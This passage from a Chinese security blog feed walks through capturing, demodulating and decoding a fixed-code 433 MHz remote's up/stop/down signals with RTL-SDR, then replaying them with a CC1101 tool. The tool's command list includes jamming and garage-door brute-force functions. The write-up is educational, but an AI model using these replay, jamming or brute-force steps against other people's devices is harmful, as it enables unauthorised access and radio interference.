alt="26"></p><p>经观察，三种功能的信号结构大致相同，都是一大段连续的波+断断续续的脉冲，采用OOK调制。选中的每段脉冲+空白长度都是1050，单个短脉冲长度350，长脉冲长度700相当于两个短脉冲。我们可以推测一个bit对应350个样本，将左侧分析参数中的   <code>Samples/symbol </code>修改为350。这里具体的样本数每次接收都会不同，但是波的组成是一样的，需要根据具体接收的样本数调整解调参数。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/27.png" alt="27"></p><p>在Signal View也可以将信号显示为解调状态</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/28.png" alt="28"></p><p>解调后，三个功能分别得到如下数据</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#up</span><br><span class="hljs-string">d24926d24d24d26da492493493493</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">11343</span> <span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49a498</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8239 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49a498</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8236 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49a498</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8231 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49a498</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8232 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49a498</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8222 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49a498</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">16687</span> <span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49b6d</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8577 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49b6d</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8573 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49b6d</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">2973321</span> <span class="hljs-string">samples</span>]<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#stop</span><br><span class="hljs-string">d24926d24d24d26da4924934d34d3</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">11341</span> <span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a69a698</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8231 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a69a698</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8238 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a69a698</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8231 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a69a698</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8226 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a69a698</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8237 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a69a698</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">16714</span> <span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a69a698</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">3026397</span> <span class="hljs-string">samples</span>]<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"> <span class="hljs-comment">#down</span><br><span class="hljs-string">d24926d24d24d26da49249349b49b</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">11369</span> <span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4da4d800003fff09a4924da49a49a4db4924926936936</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8262 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4da4d8</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8257 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4da4d8</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8263 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4da4d8</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8254 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4da4d8</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">16772</span> <span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4db69</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8611 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4db69</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8606 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4db69</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">1909995</span> <span class="hljs-string">samples</span>]<br></code></pre></td></tr></table></figure><h3 id="分析编码和协议"><a href="#分析编码和协议" class="headerlink" title="分析编码和协议"></a>分析编码和协议</h3><p>三种功能信号的整体结构如图</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/29.png" alt="29"></p><p>细看功能码的结构推测编码时3bit一组，通过占空比进一步区分0和1，占空比高表示1，占空比低表示0， 即在上面解调出来的数据中，100对应1，110对应0。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR%E9%85%8D%E5%90%88CC1101%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7/30.png" alt="30"></p><p>按3bit一组对解调数据进一步编码后信号数据如下(功能码都省略掉了10个高位bit+3个低位bit的前缀，即一长串连续波的部分)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">up</span>开始码:  <span class="hljs-number">1000</span> <span class="hljs-number">0001</span> <span class="hljs-number">1000</span> <span class="hljs-number">1000</span> <span class="hljs-number">1001</span> <span class="hljs-number">1100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0010</span> <span class="hljs-number">0010</span> <span class="hljs-number">001</span><br><span class="hljs-attribute">up</span>功能码:  <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">1100</span> <span class="hljs-number">0100</span> <span class="hljs-number">0100</span> <span class="hljs-number">1110</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">0001</span> <span class="hljs-number">0001</span><br><span class="hljs-attribute">up</span>结束码:  <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">1100</span> <span class="hljs-number">0100</span> <span class="hljs-number">0100</span> <span class="hljs-number">1110</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">0001</span> <span class="hljs-number">1110</span><br><br><span class="hljs-attribute">stop</span>开始码:<span class="hljs-number">1000</span> <span class="hljs-number">0001</span> <span class="hljs-number">1000</span> <span class="hljs-number">1000</span> <span class="hljs-number">1001</span> <span class="hljs-number">1100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0010</span> <span class="hljs-number">1010</span> <span class="hljs-number">101</span><br><span class="hljs-attribute">stop</span>功能码:<span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">1100</span> <span class="hljs-number">0100</span> <span class="hljs-number">0100</span> <span class="hljs-number">1110</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">0101</span> <span class="hljs-number">0101</span><br><br><span class="hljs-attribute">down</span>开始码:<span class="hljs-number">1000</span> <span class="hljs-number">0001</span> <span class="hljs-number">1000</span> <span class="hljs-number">1000</span> <span class="hljs-number">1001</span> <span class="hljs-number">1100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0010</span> <span class="hljs-number">0110</span> <span class="hljs-number">011</span><br><span class="hljs-attribute">down</span>功能码:<span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">1100</span> <span class="hljs-number">0100</span> <span class="hljs-number">0100</span> <span class="hljs-number">1110</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">0011</span> <span class="hljs-number">0011</span><br><span class="hljs-attribute">down</span>结束码:<span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">1100</span> <span class="hljs-number">0100</span> <span class="hljs-number">0100</span> <span class="hljs-number">1110</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">0011</span> <span class="hljs-number">1100</span><br></code></pre></td></tr></table></figure><p>我们发现开始码都是39位，功能码都是40位，各功能的开始码后7位不同，功能码和结束码的后8位不同。</p><p>参考<a href="https://www.cnblogs.com/H4lo/p/10585271.html">该文章</a>可知最常见的PT226X固定码一般包括三个部分：同步位、地址位、数据位。</p><ul><li>同步位：提示接收器解码类型；使接收器的处理程序和信号同步</li><li>地址位：设备id，区分设备</li><li>数据位：功能编号，区分功能</li></ul><p>推测开始码后7位不同和其它码的后8位是数据位。更多的分析需要结合硬件或固件逆向进行验证，由于遥控器不方便拆除，这里直接进行重放，否则拆除后要买新遥控器重新拆卸电机进行对码。</p><h3 id="进行重放"><a href="#进行重放" class="headerlink" title="进行重放"></a>进行重放</h3><p>CC1101有以下的功能</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">help</span><br><span class="hljs-attribute">setmodulation</span> &lt;mode&gt; ：设置调制模式。 <span class="hljs-number">0</span> = <span class="hljs-number">2</span>-FSK，<span class="hljs-number">1</span> = GFSK，<span class="hljs-number">2</span> = ASK/OOK，<span class="hljs-number">3</span> = <span class="hljs-number">4</span>-FSK，<span class="hljs-number">4</span> = MSK。<br><br><span class="hljs-attribute">setmhz</span> &lt;频率&gt; ：在这里您可以设置基本频率。默认 = <span class="hljs-number">433</span>.<span class="hljs-number">92</span> ）。cc1101 可以：<span class="hljs-number">300</span>-<span class="hljs-number">348</span> MHZ、<span class="hljs-number">387</span>-<span class="hljs-number">464</span>MHZ 和 <span class="hljs-number">779</span>-<span class="hljs-number">928</span>MHZ。<br><br><span class="hljs-attribute">setdeviation</span> &lt;deviation&gt; ：设置频率偏差（以 kHz 为单位）。值从 <span class="hljs-number">1</span>.<span class="hljs-number">58</span> 到 <span class="hljs-number">380</span>.<span class="hljs-number">85</span>。<br><br><span class="hljs-attribute">setchannel</span> &lt;channel&gt; ：设置从 <span class="hljs-number">0</span> 到 <span class="hljs-number">255</span> 的 Channelnumber。默认为 cahnnel <span class="hljs-number">0</span>。<br><br><span class="hljs-attribute">setchsp</span> &lt;spacing&gt; ：通道间隔乘以通道号 CHAN，并添加到基频（以 kHz 为单位）。值从 <span class="hljs-number">25</span>.<span class="hljs-number">39</span> 到 <span class="hljs-number">405</span>.<span class="hljs-number">45</span>。<br><br><span class="hljs-attribute">setrxbw</span> &lt;Receive bndwth&gt; ：设置接收带宽（以 kHz 为单位）。值从 <span class="hljs-number">58</span>.<span class="hljs-number">03</span> 到 <span class="hljs-number">812</span>.<span class="hljs-number">50</span>。<br><br><span class="hljs-attribute">setdrate</span> &lt;datarate&gt; ：设置数据速率（以 kBaud 为单位）。值从 <span class="hljs-number">0</span>.<span class="hljs-number">02</span> 到 <span class="hljs-number">1621</span>.<span class="hljs-number">83</span>。<br><br><span class="hljs-attribute">setpa</span> &lt;功率值&gt;：设置射频发射功率。根据频段，可以进行以下设置。  (-<span class="hljs-number">30</span> -<span class="hljs-number">20</span> -<span class="hljs-number">15</span> -<span class="hljs-number">10</span> -<span class="hljs-number">6</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">7</span> <span class="hljs-number">10</span> <span class="hljs-number">11</span> <span class="hljs-number">12</span>) 默认为最大值！<br><br><span class="hljs-attribute">setsyncmode</span> &lt;同步模式&gt;：组合同步字限定符模式。 <span class="hljs-number">0</span> = 无前导码/同步。 <span class="hljs-number">1</span> = 检测到 <span class="hljs-number">16</span> 个同步字位。 <span class="hljs-number">2</span> = 检测到 <span class="hljs-number">16</span>/<span class="hljs-number">16</span> 同步字位。 <span class="hljs-number">3</span> = 检测到 <span class="hljs-number">30</span>/<span class="hljs-number">32</span> 个同步字位。 <span class="hljs-number">4</span> = 无前导码/同步，载波侦听高于阈值。 <span class="hljs-number">5</span> = <span class="hljs-number">15</span>/<span class="hljs-number">16</span> + 载波侦听高于阈值。 <span class="hljs-number">6</span> = <span class="hljs-number">16</span>/<span class="hljs-number">16</span> + 载波侦听高于阈值。 <span class="hljs-number">7</span> = <span class="hljs-number">30</span>/<span class="hljs-number">32</span> + 载波侦听高于阈值。<br><br><span class="hljs-attribute">setsyncword</span> &lt;十进制低位，十进制高位&gt;：设置同步字。发射器和接收器必须相同。 （同步字高，同步字低）默认值为 <span class="hljs-number">211</span>,<span class="hljs-number">145</span><br><br><span class="hljs-attribute">setadrchk</span> &lt;address chk&gt; ：控制接收包的地址检查配置。 <span class="hljs-number">0</span> = 不检查地址。 <span class="hljs-number">1</span> = 地址检查，无广播。 <span class="hljs-number">2</span> = 地址检查和 <span class="hljs-number">0</span> (<span class="hljs-number">0</span>x00) 广播。 <span class="hljs-number">3</span> = 地址检查和 <span class="hljs-number">0</span> (<span class="hljs-number">0</span>x00) 和 <span class="hljs-number">255</span> (<span class="hljs-number">0</span>xFF) 广播。<br><br><span class="hljs-attribute">setaddr</span> &lt;address&gt; ：用于数据包过滤的地址。可选的广播地址为 <span class="hljs-number">0</span> (<span class="hljs-number">0</span>x00) 和 <span class="hljs-number">255</span> (<span class="hljs-number">0</span>xFF)。<br><br><span class="hljs-attribute">setwhitedata</span> &lt;whitening&gt; ：打开/关闭数据白化。 <span class="hljs-number">0</span> = 美白关闭。 <span class="hljs-number">1</span> = 美白开启。<br><br><span class="hljs-attribute">setpktformat</span> &lt;pktformat&gt; ：RX 和 TX 数据的格式。 <span class="hljs-number">0</span> = 正常模式，使用 FIFO 进行 RX 和 TX。 <span class="hljs-number">1</span> = 同步串行模式，数据在 GDO0 上输入，数据在任一 GDOx 引脚上输出。 <span class="hljs-number">2</span> = 随机发送模式；使用 PN9 发生器发送随机数据。  <span class="hljs-number">3</span> = 异步串行模式<br><br><span class="hljs-attribute">setlengthconfig</span> &lt;mode&gt;：设置数据包长度模式：<span class="hljs-number">0</span> = 固定数据包长度模式。 <span class="hljs-number">1</span> = 可变数据包长度模式。 <span class="hljs-number">2</span> = 无限数据包长度模式。 <span class="hljs-number">3</span> = 保留<br><br><span class="hljs-attribute">setpacketlength</span> &lt;mode&gt; ：表示启用固定数据包长度模式时的数据包长度。如果使用可变包长模式，该值表示允许的最大包长度。<br><br><span class="hljs-attribute">setcrc</span> &lt;mode&gt; ：打开/关闭 CRC 计算和检查。 <span class="hljs-number">1</span> = 启用 TX 中的 CRC 计算和 RX 中的 CRC 检查。 <span class="hljs-number">0</span> = TX 和 RX 禁用 CRC。<br><br><span class="hljs-attribute">setcrcaf</span> &lt;mode&gt; ：当 CRC 不正确时启用 RX FIFO 的自动刷新。这要求 RXIFIFO 中只有一个数据包，并且数据包长度仅限于 RX FIFO 大小。<br><br><span class="hljs-attribute">setdcfilteroff</span> &lt;mode&gt; ：在解调器之前禁用数字直流阻塞滤波器。仅适用于数据速率 ≤ <span class="hljs-number">250</span> kBaud 当禁用 DC 阻塞时，建议的 IF 频率会发生变化。 <span class="hljs-number">1</span> = 禁用（当前优化）。 <span class="hljs-number">0</span> = 启用（更好的灵敏度）。<br><br><span class="hljs-attribute">setmanchester</span> &lt;mode&gt; ：启用曼彻斯特编码/解码。 <span class="hljs-number">0</span> = 禁用。 <span class="hljs-number">1</span> = 启用。<br><br><span class="hljs-attribute">setfec</span> &lt;mode&gt;：启用前向纠错 (FEC)，并交织数据包负载（仅支持固定数据包长度模式。<span class="hljs-number">0</span> = 禁用。<span class="hljs-number">1</span> = 启用。<br><br><span class="hljs-attribute">setpre</span> &lt;mode&gt; ：设置要传输的最小前导码字节数。值：<span class="hljs-number">0</span> : <span class="hljs-number">2</span>、<span class="hljs-number">1</span> : <span class="hljs-number">3</span>、<span class="hljs-number">2</span> : <span class="hljs-number">4</span>、<span class="hljs-number">3</span> : <span class="hljs-number">6</span>、<span class="hljs-number">4</span> : <span class="hljs-number">8</span>、<span class="hljs-number">5</span> : <span class="hljs-number">12</span>、<span class="hljs-number">6</span> : <span class="hljs-number">16</span>、<span class="hljs-number">7</span> : <span class="hljs-number">24</span><br><br><span class="hljs-attribute">setpqt</span> &lt;mode&gt;：前导码质量估计器阈值。<br><br><span class="hljs-attribute">setappendstatus</span> &lt;mode&gt; ：启用后，两个状态字节将附加到数据包的有效负载中。状态字节包含 RSSI 和 LQI 值以及 CRC OK。<br><br><span class="hljs-attribute">getrssi</span> ：显示有关通过 RF 最后接收的帧的质量信息<br><br><span class="hljs-attribute">scan</span> &lt;start&gt; &lt;stop&gt; ：扫描最高信号的频率范围。<br><br><span class="hljs-attribute">chat</span> ：在许多设备之间启用聊天模式。无法退出，请断开设备退出<br><br><span class="hljs-attribute">rx</span>：嗅探器。启用或禁用在串行终端上打印接收到的 RF 数据包。<br><br><span class="hljs-attribute">tx</span> &lt;hex-vals&gt; ：通过 RF 发送最大 <span class="hljs-number">60</span> 字节 &lt;hex 值&gt; 的数据包<br><br><span class="hljs-attribute">jam</span> ：启用或禁用所选频段的连续干扰。<br><br><span class="hljs-attribute">brute</span> &lt;microseconds&gt; &lt;number-of-bits&gt; ：使用 &lt;nb-of-bits&gt; 关键字进行暴力车库门，其中符号时间为 &lt;usec&gt;。<br><br><span class="hljs-attribute">rec</span> ：启用或禁用缓冲区中的记录帧。<br><br><span class="hljs-attribute">add</span> &lt;hex-vals&gt; ：手动将单帧有效负载（最多 <span class="hljs-number">64</span> 个十六进制值）添加到缓冲区，以便可以重播<br><br><span class="hljs-attribute">show</span> : 显示录音缓冲区的内容<br><br><span class="hljs-attribute">lush</span> : 清空记录缓冲区<br><br><span class="hljs-attribute">play</span> &lt;N&gt; ：重播 <span class="hljs-number">0</span> = 所有帧或先前存储在缓冲区中的第 N 个记录帧。<br><br><span class="hljs-attribute">rxraw</span> &lt;microseconds&gt; ：通过以 &lt;microsecond&gt; 间隔采样来嗅探无线电并以十六进制打印接收到的字节。<br><br><span class="hljs-attribute">recraw</span> &lt;微秒&gt; ：以 &lt;微秒&gt; 采样间隔记录 RAW RF 数据。<br><br><span class="hljs-attribute">addraw</span> &lt;hex-vals&gt; ：手动将块（最多 <span class="hljs-number">60</span> 个十六进制值）添加到缓冲区，以便可以进一步重播它们。<br><br><span class="hljs-attribute">showraw</span> ：以 RAW 格式显示记录缓冲区的内容。<br><br><span class="hljs-attribute">playraw</span> &lt;microseconds&gt; ：以 &lt;microsecond&gt; 采样间隔重播之前记录的 RAW RF 数据。<br><br><span class="hljs-attribute">showbit</span> ：以 RAW 格式将记录缓冲区的内容显示为位流。<br><br><span class="hljs-attribute">save</span> ：将录音缓冲区内容存储在非易失性存储器中<br><br><span class="hljs-attribute">load</span> ：将内容从非易失性存储器加载到记录缓冲区<br><br><span class="hljs-attribute">echo</span> &lt;mode&gt; ：在串行终端上启用或禁用 Echo。 <span class="hljs-number">1</span> = 启用，<span class="hljs-number">0</span> = 禁用<br><br><span class="hljs-attribute">x</span>：停止干扰/接收/记录数据包。<br><br><span class="hljs-attribute">init</span> ：使用默认参数重新启动 CC1101 板<br></code></pre></td></tr></table></figure><p>1.设置调制模式</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">setmodulation</span> &lt;mode&gt; ：设置调制模式。 <span class="hljs-number">0</span> = <span class="hljs-number">2</span>-FSK，<span class="hljs-number">1</span> = GFSK，<span class="hljs-number">2</span> = ASK/OOK，<span class="hljs-number">3</span> = <span class="hljs-number">4</span>-FSK，<span class="hljs-number">4</span> = MSK。<br></code></pre></td></tr></table></figure><p>2.设置频率</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">setmhz</span> &lt;频率&gt; ：在这里您可以设置基本频率。默认 = <span class="hljs-number">433</span>.<span class="hljs-number">92</span>）。cc1101 可以：<span class="hljs-number">300</span>-<span class="hljs-number">348</span> MHZ、<span class="hljs-number">387</span>-<span class="hljs-number">464</span>MHZ 和 <span class="hljs-number">779</span>-<span class="hljs-number">928</span>MHZ。<br></code></pre></td></tr></table></figure><p>3.构造信号</p><p>4.设置缓冲区</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">addraw</span> &lt;hex-vals&gt; ：手动将块（最多 <span class="hljs-number">60</span> 个十六进制值）添加到缓冲区，以便可以进一步重播它们。<br></code></pre></td></tr></table></figure><p>5.重放</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">playraw <span class="hljs-tag">&lt;<span class="hljs-name">microseconds</span>&gt;</span> ：以 <span class="hljs-tag">&lt;<span class="hljs-name">microsecond</span>&gt;</span> 采样间隔重播之前记录的 RAW RF 数据。<br></code></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.bilibili.com/video/BV11YULYjEfy?buvid=XXB101DBC5BCEDAA71E7A667BA70846F027E0&from_spmid=main.space.0.0&is_story_h5=false&mid=ZW+JMDuH6jGFZzO8EAxp538FTQ/SZMtL1rElX6M3iMo=&plat_id=116&share_from=ugc&share_medium=android&share_plat=android&share_session_id=46368a77-d0ff-42c7-84ce-5d5087cd3eda&share_source=QQ&share_tag=s_i&spmid=united.player-video-detail.0.0&timestamp=1731591225&unique_k=amknhbS&up_id=3546704284486481&vd_source=4d7ceec86e24de9c1f10dcb04b1715f0">【星盟安全】PWN系列课程 无线电安全基础入门</a></p><p><a href="https://github.com/sbusso/cc1101-tool">cc1101-tool</a></p><p><a href="https://www.cyqsd.cn/7997.html">使用R820T+RTL2832U玩软件无线电</a></p><p><a href="https://www.youngroe.com/2021/09/23/IOT/iot-security-part-8-introduction-to-software-defined-radio-sdr/">物联网安全101-8.软件无线电（Software Defined Radio，SDR）简介（翻译）</a></p><p><a href="https://blog.csdn.net/weixin_39663602/article/details/111298868">sdr 软件_【SDR】软件无线电入门玩法，让你不用网络接收电视频道、追踪飞机…</a></p><p><a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E6%97%A0%E7%BA%BF%E7%94%B5">软件无线电wiki</a></p><p><a href="https://www.21ic.com/evm/evaluate/expansion/201609/688481.htm">433MHz低功耗RF收发芯片——CC1101评测</a></p><p><a href="https://zhuoqing.blog.csdn.net/article/details/133760488?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-133760488-blog-111298868.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-133760488-blog-111298868.235%5Ev43%5Epc_blog_bottom_relevance_base3&utm_relevant_index=1">软件无线电模块测试 : SDR++ 软件测试</a></p><p><a href="http://rachina.org.cn/data/attachement/pdf/site122/20180604/00016c58d7ef1c7eddf103.pdf">我国无线电频率划分和规划概况</a></p><p><a href="https://cloud.tencent.com/developer/article/1379284">使用HackCube-Special分析滚动码信号</a></p><p><a href="https://blog.csdn.net/spenghui/article/details/71930428">Hitag2加密方案简述</a></p><p><a href="https://www.iotsec-zone.com/article/47">无线遥控信号逆向分析</a></p><p><a href="https://www.cnblogs.com/H4lo/p/10585271.html">315MHz 遥控器固定码信号分析和重放</a></p><p><a href="https://bbs.hassbian.com/thread-1350-1-1.html">[基础教程]获取并发射杜亚433.92Mhz遥控器的发射码</a></p><p><a href="https://blog.csdn.net/zunly/article/details/127084726">三天时间, 无线破解从入门到放弃</a></p>]]></content>
    
    
    <categories>
      
      <category>无线电安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>无线电安全</tag>
      
      <tag>HAM</tag>
      
      <tag>SDR</tag>
      
      <tag>遥控编码</tag>
      
      <tag>CC1101</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pixel3刷机安卓12及root记录附相关知识整理</title>
    <link href="/2024/12/15/pixel3%E5%88%B7%E6%9C%BA%E5%AE%89%E5%8D%9312%E5%8F%8Aroot%E8%AE%B0%E5%BD%95%E9%99%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
    <url>/2024/12/15/pixel3%E5%88%B7%E6%9C%BA%E5%AE%89%E5%8D%9312%E5%8F%8Aroot%E8%AE%B0%E5%BD%95%E9%99%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/</url>
    
